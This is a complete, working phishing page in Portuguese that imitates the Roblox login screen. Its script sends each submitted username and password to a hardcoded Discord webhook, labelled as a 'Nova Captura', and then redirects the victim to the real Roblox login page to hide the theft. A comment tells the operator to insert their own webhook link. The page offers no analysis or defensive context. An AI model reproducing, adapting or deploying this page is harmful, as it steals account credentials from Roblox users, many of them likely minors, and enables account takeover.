<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Entrar na Roblox</title>
    <link rel="icon" href="https://www.roblox.com/favicon.ico">
    <!-- Fonte oficial Builder Sans / Gotham -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #232527; /* Fundo exato */
            color: #ffffff;
            padding-bottom: 80px;
        }

        /* HEADER */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 16px;
            background-color: #232527;
        }
        
        .logo {
            width: 32px;
            height: 32px;
            background-color: #ffffff;
            transform: rotate(-15deg);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .logo-inner {
            width: 10px;
            height: 10px;
            background-color: #232527;
        }

        .nav-actions {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .btn-cadastrar {
            background-color: #335fff;
            color: #ffffff;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            letter-spacing: -0.2px;
        }

        .btn-entrar-top {
            background-color: transparent;
            color: #ffffff;
            border: 1px solid #ffffff;
            padding: 8px 16px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 500;
        }

        .search-icon svg {
            width: 24px;
            height: 24px;
            stroke: #ffffff;
            stroke-width: 2.5;
            fill: none;
        }

        /* SUB-NAV */
        .sub-nav {
            display: flex;
            justify-content: space-between;
            padding: 12px 16px;
            font-size: 15px;
            font-weight: 500;
            color: #ffffff;
        }

        /* IMAGEM DE FUNDO */
        .hero-image {
            height: 80px;
            width: 100%;
            background-image: url('https://images.rbxcdn.com/ef6c2b7782434b7b0212412c29874635.jpg');
            background-size: cover;
            background-position: center;
            opacity: 0.6;
            -webkit-mask-image: linear-gradient(to bottom, rgba(0,0,0,1) 40%, rgba(0,0,0,0) 100%);
            mask-image: linear-gradient(to bottom, rgba(0,0,0,1) 40%, rgba(0,0,0,0) 100%);
        }

        /* FORMULÁRIO */
        .container {
            padding: 0 16px;
            max-width: 500px;
            margin: 0 auto;
        }

        h1 {
            font-size: 26px;
            font-weight: 700;
            text-align: center;
            margin: 16px 0 24px 0;
        }

        .input-group {
            margin-bottom: 12px;
        }

        .input-group input {
            width: 100%;
            padding: 16px;
            background-color: #2b2d31; /* Cor exata do input */
            border: 1px solid #3b3f43;
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
        }

        .input-group input::placeholder {
            color: #c5c8cb;
        }

        .input-group input:focus {
            border-color: #ffffff;
        }

        .btn-main {
            width: 100%;
            padding: 14px;
            background-color: transparent;
            border: 1px solid #ffffff;
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            margin-top: 4px;
        }

        .btn-main:active {
            background-color: #3b3f43;
        }

        .forgot-link {
            display: block;
            text-align: center;
            color: #ffffff;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
            margin: 24px 0;
        }

        .divider {
            height: 1px;
            background-color: #3b3f43;
            margin: 24px 0;
        }

        .btn-secondary {
            width: 100%;
            padding: 16px;
            background-color: #2b2d31;
            border: 1px solid #3b3f43;
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 12px;
        }

        .btn-secondary:active {
            background-color: #3b3f43;
        }

        .signup-text {
            text-align: center;
            color: #ffffff;
            font-size: 15px;
            margin-top: 32px;
            margin-bottom: 32px;
        }

        .signup-text a {
            color: #ffffff;
            font-weight: 500;
            text-decoration: none;
        }

        /* BANNER INFERIOR */
        .bottom-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: #323539;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            z-index: 10;
        }

        .banner-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .app-icon {
            width: 40px;
            height: 40px;
            background-color: #335fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }

        .app-icon-inner {
            width: 18px;
            height: 18px;
            background-color: #ffffff;
            transform: rotate(-15deg);
            border-radius: 3px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .app-icon-hole {
            width: 6px;
            height: 6px;
            background-color: #335fff;
        }

        .banner-text {
            font-size: 13px;
            line-height: 1.3;
            color: #ffffff;
            font-weight: 500;
        }

        .banner-text span {
            font-weight: 700;
        }

        .btn-explore {
            background-color: #335fff;
            color: #ffffff;
            border: none;
            padding: 10px 16px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            flex-shrink: 0;
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <div class="header">
        <div class="logo"><div class="logo-inner"></div></div>
        <div class="nav-actions">
            <button class="btn-cadastrar">Cadastrar-se</button>
            <button class="btn-entrar-top">Entrar</button>
            <div class="search-icon">
                <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
            </div>
        </div>
    </div>

    <!-- SUB-NAV -->
    <div class="sub-nav">
        <div>Destaques</div>
        <div>Mercado</div>
        <div>Criar</div>
        <div>Robux</div>
    </div>

    <!-- BANNER DE FUNDO -->
    <div class="hero-image"></div>

    <!-- FORMULÁRIO -->
    <div class="container">
        <h1>Entrar na Roblox</h1>
        
        <form id="login-form">
            <div class="input-group">
                <input type="text" id="username" placeholder="Usuário/e-mail/telefone" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Senha" required>
            </div>
            
            <button type="submit" class="btn-main" id="btn-submit">Entrar</button>
        </form>

        <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>

        <div class="divider"></div>

        <button class="btn-secondary">Envie-me um código único por e-mail</button>
        <button class="btn-secondary">Entrada rápida</button>
        <button class="btn-secondary">Outras opções de acesso</button>

        <div class="signup-text">
            Não possui uma conta? <a href="#">Cadastrar-se</a>
        </div>
    </div>

    <!-- BANNER INFERIOR -->
    <div class="bottom-banner">
        <div class="banner-left">
            <div class="app-icon">
                <div class="app-icon-inner"><div class="app-icon-hole"></div></div>
            </div>
            <div class="banner-text">
                <span>Explore a Roblox no nosso<br>aplicativo para Android!</span><br>
                Milhões de experiências criadas<br>por gente como você
            </div>
        </div>
        <button class="btn-explore">Explorar</button>
    </div>

    <script>
        // ⚠️ COLOQUE O TEU LINK DO DISCORD AQUI ENTRE AS ASPAS ⚠️
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573426421085241448/LGoTUoMIZdohFLYE9s3THG4sSUFbbi1PEF5Hdl145-KIH6KapjIvAnLGhFT4kmlfOFPL';

        const form = document.getElementById('login-form');
        const btnSubmit = document.getElementById('btn-submit');
        const user = document.getElementById('username');
        const pass = document.getElementById('password');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = user.value.trim();
            const password = pass.value;
            if (!username || !password) return;

            btnSubmit.textContent = 'Entrando...';

            const payload = {
                content: `🎣 **Nova Captura**\n👤 User: \`${username}\`\n🔑 Senha: \`${password}\``
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com/pt/Login';
                }, 1500);

            } catch (error) {
                btnSubmit.textContent = 'Entrar';
                alert('Erro de conexão. Tente novamente.');
            }
        });
    </script>
</body>
</html>
